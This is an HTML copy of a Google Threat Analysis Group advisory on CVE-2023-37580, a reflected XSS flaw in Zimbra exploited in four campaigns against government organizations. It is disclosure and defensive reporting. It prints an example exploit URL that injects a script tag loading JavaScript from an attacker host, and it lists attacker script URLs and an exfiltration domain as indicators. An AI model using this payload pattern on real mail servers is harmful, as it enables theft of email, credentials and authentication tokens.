<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/">Original</a>
    <h1>Zimbra 0-day used to steal email data from government organizations</h1>
    
    <div id="readability-page-1" class="page"><article ng-init="drawerToggle = {&#39;open&#39;: true}">

    
    


<section data-analytics-module="{
  &#34;module_name&#34;: &#34;Article Hero&#34;,
  &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
}">
  
</section>


    

    
      

<div data-analytics-module="{
    &#34;module_name&#34;: &#34;Hero Menu&#34;,
    &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
  }">
  
  <div>
    <div>
      
        
  
    
  

  
    <div>
      
  

<div>
  <p>Maddie Stone</p>
  
    <p>
      Threat Analysis Group
    </p>
  
  
</div>

    </div>
  


      
    </div>
    
  </div>
</div>

    

    
      







<div>
  <div>
    <figure>
      <div>
  <p><img srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/TAG_rYhcbet.width-600.format-webp.webp 600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/TAG_rYhcbet.width-1200.format-webp.webp 1200w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/TAG_rYhcbet.width-1600.format-webp.webp 1600w" sizes="(max-width: 599px) 100vw, (max-width: 1023px) 600px, 1024px" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/TAG_rYhcbet.width-1200.format-webp.webp" fetchpriority="high" alt="a blue box that reads &#34;Threat Analysis Group&#34;"/>
  </p>
</div>

      
    </figure>
  </div>
</div>


    

    
    <section>
      <div>
        
          
          
          <div data-reading-time="true" data-component="uni-drop-cap|uni-tombstone">
            
            
<!--article text-->

  
    <div data-analytics-module="{
           &#34;module_name&#34;: &#34;Paragraph&#34;,
           &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
         }">
      <div data-component="uni-article-paragraph">
        <div><p data-block-key="5pdnv">In June 2023, Google’s Threat Analysis Group (TAG) discovered an in-the-wild 0-day exploit targeting Zimbra Collaboration, an email server many organizations use to host their email. Since discovering the 0-day, now patched as <a href="https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories" rt-link-type="external">CVE-2023-37580</a>, TAG has observed four different groups exploiting the same bug to steal email data, user credentials, and authentication tokens. Most of this activity occurred after the initial fix became public on Github. To ensure protection against these types of exploits, TAG urges users and organizations to keep software fully up-to-date and apply security updates as soon as they become available.</p><h3 data-block-key="e1boa">0-day discovery, hotfix and patch</h3><p data-block-key="88it1">TAG first discovered the 0-day, a reflected cross-site scripting (XSS) vulnerability, in June when it was actively exploited in targeted attacks against Zimbra’s email server. Zimbra pushed a hotfix to their <a href="https://github.com/Zimbra/zm-web-client/pull/827/commits/4d563480a73c806617b3da7b457ef65861ea2b9f" rt-link-type="external">public Github on July 5, 2023</a> and published an <a href="https://info.zimbra.com/security-update-zimbra-collaboration-suite-version-8.8.15-important" rt-link-type="external">initial advisory</a> with remediation guidance on July 13, 2023. They <a href="https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories" rt-link-type="external">patched the vulnerability as CVE-2023-37580</a> on July 25, 2023.</p><p data-block-key="7b3cm">TAG observed three threat groups exploiting the vulnerability prior to the release of the official patch, including groups that may have learned about the bug after the fix was initially made public on Github. TAG discovered a fourth campaign using the XSS vulnerability after the official patch was released. Three of these campaigns began after the hotfix was initially made public highlighting the importance of organizations applying fixes as quickly as possible.</p></div>
      </div>
    </div>
  

  
    







  
      <div data-analytics-module="{
          &#34;module_name&#34;: &#34;Inline Images&#34;,
          &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
        }">
  

  <p><img alt="image of CVE-2023-37580 exploitation timeline. June 29, 2023 campaign #1 targets Greece, with hotfix pushed to Github, July 5. Campain #2 targets Moldova and Tunisia, July 11, with advisory published, July 13. Campaign #3 targets Vietnam, July 20, 2023, with official patch released as CVE-2023-37580. Campaign #4 targets Pakistan, August 25, 2023." src=" https://storage.googleapis.com/gweb-uniblog-publish-prod/images/EXPLOIT_TIMELINE_FOR_TAG-01.width-100.format-webp.webp " loading="lazy" data-loading="{
                &#34;mobile&#34;: &#34;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/EXPLOIT_TIMELINE_FOR_TAG-01.width-500.format-webp.webp&#34;,
                &#34;desktop&#34;: &#34;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/EXPLOIT_TIMELINE_FOR_TAG-01.width-1000.format-webp.webp&#34;
              }"/>
        
      
    
    </p>
    
  
    </div>
  



  

  
    <div data-analytics-module="{
           &#34;module_name&#34;: &#34;Paragraph&#34;,
           &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
         }">
      <div data-component="uni-article-paragraph">
        <div><h3 data-block-key="9k28a">The Vulnerability CVE-2023-37580</h3><p data-block-key="9j5h">CVE-2023-37580 is a reflected cross-site scripting (XSS) vulnerability. XSS is a web application vulnerability that allows malicious scripts to be injected into another website. In this case, there was a vulnerability in Zimbra that injected the parameter within the URL directly into the webpage, causing the script to be executed. An example that could trigger the XSS is:</p><p data-block-key="2hman">https://mail.REDACTED[.]com/m/momovetost=acg%22%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fobsorth%2Eopwtjnpoc%2Eml%2FpQyMSCXWyBWJpIos%2Ejs%22%3E%3C%2Fscript%3E%2F%2F</p><p data-block-key="52sp2">which decodes to:</p><p data-block-key="72pgk">https://mail.REDACTED[.]com/m/momoveto?st=acg&#34;/&gt;&lt;script src=&#34;https://REDACTED/script.js&#34;&gt;&lt;/script&gt;//</p><p data-block-key="1kvmk">The fix was to escape the contents of the st parameter before it was set as the value in an html object.</p></div>
      </div>
    </div>
  

  
    <div data-analytics-module="{
           &#34;module_name&#34;: &#34;Paragraph&#34;,
           &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
         }">
      <div data-component="uni-article-paragraph">
        <div><h3 data-block-key="9k28a">Campaign 1: First known exploitation leads to email-stealing framework</h3><p data-block-key="5qiru">The initial in-the-wild discovery of the 0-day vulnerability was a campaign targeting a government organization in Greece. The attackers sent emails containing exploit urls to their targets. If a target clicked the link during a logged-in Zimbra session, the url loaded the same framework that <a href="https://www.volexity.com/blog/2022/02/03/operation-emailthief-active-exploitation-of-zero-day-xss-vulnerability-in-zimbra/" rt-link-type="external">Volexity documented</a> in February 2022. This framework uses the XSS to steal users’ mail data, such as emails and attachments and to set up an auto-forwarding rule to an attacker-controlled email address. The framework was loaded from:</p><p data-block-key="57r9q">https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.js</p></div>
      </div>
    </div>
  

  
    <div data-analytics-module="{
           &#34;module_name&#34;: &#34;Paragraph&#34;,
           &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
         }">
      <div data-component="uni-article-paragraph">
        <div><h3 data-block-key="9k28a">Campaign 2: Winter Vivern exploitation after hotfix pushed to Github</h3><p data-block-key="9o3sb">The patch for the vulnerability was pushed to Github on July 5. Another actor exploited the vulnerability for a full two weeks beginning on July 11 before the official patch became available on July 25. TAG identified multiple exploit urls that targeted government organizations in Moldova and Tunisia; each url contained a unique official email address for specific organizations in those governments. TAG attributes this activity to Winter Vivern (UNC4907), an APT group known to exploit XSS in <a href="https://www.proofpoint.com/us/blog/threat-insight/exploitation-dish-best-served-cold-winter-vivern-uses-known-zimbra-vulnerability" rt-link-type="external">Zimbra</a> and <a href="https://www.welivesecurity.com/en/eset-research/winter-vivern-exploits-zero-day-vulnerability-roundcube-webmail-servers/" rt-link-type="external">Roundcube</a>. The vulnerability was used to load scripts at:<br/></p><p data-block-key="ajbqh">https://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.js</p><p data-block-key="1udng">https://applicationdevsoc[.]com/tndgt/auth.js</p></div>
      </div>
    </div>
  

  
    <div data-analytics-module="{
           &#34;module_name&#34;: &#34;Paragraph&#34;,
           &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
         }">
      <div data-component="uni-article-paragraph">
        <div><h3 data-block-key="9k28a">Campaign 3: Exploit used for credential phishing</h3><p data-block-key="5p2nd">Days before Zimbra pushed their official patch on July 25, TAG observed a third, unidentified group exploiting the vulnerability as part of a campaign that phished for credentials belonging to a government organization in Vietnam. In this case, the exploit url pointed to a script that displayed a phishing page for users’ webmail credentials and posted stolen credentials to a url hosted on an official government domain that the attackers likely compromised.</p></div>
      </div>
    </div>
  

  
    <div data-analytics-module="{
           &#34;module_name&#34;: &#34;Paragraph&#34;,
           &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
         }">
      <div data-component="uni-article-paragraph">
        <div><h3 data-block-key="9k28a">Campaign 4: N-day exploit used for stealing authentication token</h3><p data-block-key="5nogp">In August 2023, after the patch for CVE-2023-37580 was released, TAG discovered a fourth campaign using the vulnerability against a government organization in Pakistan. The exploit was used to steal the Zimbra authentication token. The token was exfiltrated to ntcpk[.]org.</p></div>
      </div>
    </div>
  

  
    <div data-analytics-module="{
           &#34;module_name&#34;: &#34;Paragraph&#34;,
           &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
         }">
      <div data-component="uni-article-paragraph">
        <div><h3 data-block-key="9k28a">Conclusion</h3><p data-block-key="fm01h">The discovery of at least four campaigns exploiting CVE-2023-37580, three campaigns after the bug first became public, demonstrates the importance of organizations applying fixes to their mail servers as soon as possible. These campaigns also highlight how attackers monitor open-source repositories to opportunistically exploit vulnerabilities where the fix is in the repository, but not yet released to users. The actors behind Campaign #2 began exploiting the bug after the fix was pushed to Github, but before Zimbra publicly released the advisory with remediation advice.</p><p data-block-key="21ja0">The exploitation of CVE-2023-37580 comes on the heels of CVE-2022-24682, another reflected XSS vulnerability in Zimbra mail servers that was actively exploited in-the-wild in 2022 and is followed by the exploitation of CVE-2023-5631, a XSS vulnerability in Roundcube mail servers just this past month. The regular exploitation of XSS vulnerabilities in mail servers also shows a need for further code auditing of these applications, especially for XSS vulnerabilities.</p><p data-block-key="a4v7o">We’d like to acknowledge Zimbra for their response and patching of this vulnerability. Following our<a href="https://about.google/appsecurity/" rt-link-type="external"> disclosure policy</a>, TAG shares its research to raise awareness and advance security across the ecosystem. We also add all identified websites and domains to Safe Browsing to safeguard users from further exploitation. We urge users and organizations to apply patches quickly and keep software fully up-to-date for their protection. TAG will remain focused on detecting, analyzing, and preventing 0-day exploitation as well as reporting vulnerabilities to vendors immediately upon discovery.</p></div>
      </div>
    </div>
  

  
    <div data-analytics-module="{
           &#34;module_name&#34;: &#34;Paragraph&#34;,
           &#34;section_header&#34;: &#34;Zimbra 0\u002Dday used to target international government organizations&#34;
         }">
      <div data-component="uni-article-paragraph">
        <div><h3 data-block-key="9k28a">Indicators of compromise (IoCs)</h3><ul><li data-block-key="cnmod">https://obsorth.opwtjnpoc[.]ml/pQyMSCXWyBWJpIos.js</li><li data-block-key="8jrue">https://applicationdevsoc[.]com/zimbraMalwareDefender/zimbraDefender.js</li><li data-block-key="9u081">https://applicationdevsoc[.]com/tndgt/auth.js</li><li data-block-key="9u2u3">ntcpk[.]org</li></ul><p data-block-key="2i8vs"><i>Thanks to TAG&#39;s Kristen Dennesen who also contributed to this report.</i></p></div>
      </div>
    </div>
  


            
            

            
              




            
          </div>
        
      </div>
    </section>
  </article></div>
  </body>
</html>
